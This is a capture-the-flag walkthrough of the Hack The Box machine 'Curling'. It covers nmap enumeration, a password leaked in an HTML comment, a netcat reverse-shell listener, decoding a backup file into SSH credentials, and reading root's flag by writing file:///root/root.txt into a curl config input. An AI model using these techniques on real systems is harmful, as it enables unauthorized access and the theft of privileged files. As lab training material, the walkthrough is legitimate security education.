---
layout: single
classes: wide
title:  "Walkthrough - Curling"
date: 2019-03-31
categories:
    - "hackthebox"
    - walkthrough
tags:
    - machines
    - easy
    - linux
---

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/banner.JPG)

Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)

First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).

```bash
root@noone:/home/pswapnil/Curling# nmap -v -sC -sV -p- -oA nmap 10.10.10.150
# Nmap 7.70 scan initiated Sat Feb  2 22:09:43 2019 as: nmap -v -sC -sV -p- -oA nmap 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up (0.26s latency).
Not shown: 65521 closed ports
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp    open     http       Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
9001/tcp  filtered tor-orport
9910/tcp  filtered unknown
10693/tcp filtered unknown
12032/tcp filtered unknown
13052/tcp filtered unknown
14121/tcp filtered unknown
33922/tcp filtered unknown
37841/tcp filtered unknown
39026/tcp filtered unknown
52288/tcp filtered unknown
61124/tcp filtered unknown
62918/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  2 22:55:54 2019 -- 1 IP address (1 host up) scanned in 2770.59 seconds
```

Just two ports open, port 22 for SSH and port 80 for HTTP.
Let's start with HTTP. From the nmap scan we can see that it is a `Joomla` CMS. We get this after visiting the page.

![home]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/home.png)

Looks like the front page visible to the public. I saw a few posts written by `Super User` and `Floris`. These could be usernames.
Looking at the source, I found a comment.

![secret]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/secret.png)

Probably a file in the root directory? Let's check it out.

![pass]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/pass.png)

Looks like base64. Let's try to decode it.

```bash
root@noone:/home/pswapnil/Retired/Curling# cat secret.txt | base64 -d
Curling2018!
```

Well, probably a password? Let's navigate to the `administrator` page. A little Google-Fu showed me where could people manage the CMS.

![admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/admin.png)


```bash
root@noone:/home/pswapnil/Retired/Curling# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.39] from (UNKNOWN) [10.10.10.150] 53762
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cd /home
floris
$ cd floris
$ ls
admin-area
password_backup
user.txt
$ cat password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

I created a base64 output of the hexdump and used CyberChef to try and decode it.


It gave me a password `5d<wdCbdZu)|hChXll`. Let's use this password to login as `floris` using SSH.

```bash
root@noone:~/Curling# ssh floris@10.10.10.150
The authenticity of host '10.10.10.150 (10.10.10.150)' can't be established.
ECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.150' (ECDSA) to the list of known hosts.
floris@10.10.10.150's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Apr  7 21:24:05 UTC 2019

  System load:  0.01              Processes:            176
  Usage of /:   46.2% of 9.78GB   Users logged in:      1
  Memory usage: 21%               IP address for ens33: 10.10.10.150
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Apr  7 21:12:38 2019 from 10.10.13.89
floris@curling:~$ ls
admin-area  password_backup  user.txt
floris@curling:~$ cat user.txt
6******************************b
```

````bash
floris@curling:~/admin-area$ ls -la
total 28
drwxr-x--- 2 root   floris  4096 May 22  2018 .
drwxr-xr-x 6 floris floris  4096 Apr  7 21:13 ..
-rw-rw---- 1 root   floris    25 Apr  7 21:27 input
-rw-rw---- 1 root   floris 14236 Apr  7 21:27 report
floris@curling:~/admin-area$ cat input
url = "http://127.0.0.1"
floris@curling:~/admin-area$
<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta charset="utf-8" />
        <base href="http://127.0.0.1/" />
        <meta name="description" content="best curling site on the planet!" />
        <meta name="generator" content="Joomla! - Open Source Content Management" />
        <title>Home</title>
```snip```
<p class="pull-right">
        <a href="#top" id="back-top">
                Back to Top                             </a>
</p>
<p>
        &copy; 2019 Cewl Curling site!                  </p>
</div>
</footer>

</body>
<!-- secret.txt -->
</html>
````

```bash
floris@curling:~/admin-area$ echo 'url = "file:///root/root.txt"' > input
floris@curling:~/admin-area$ cat report
8******************************a
```
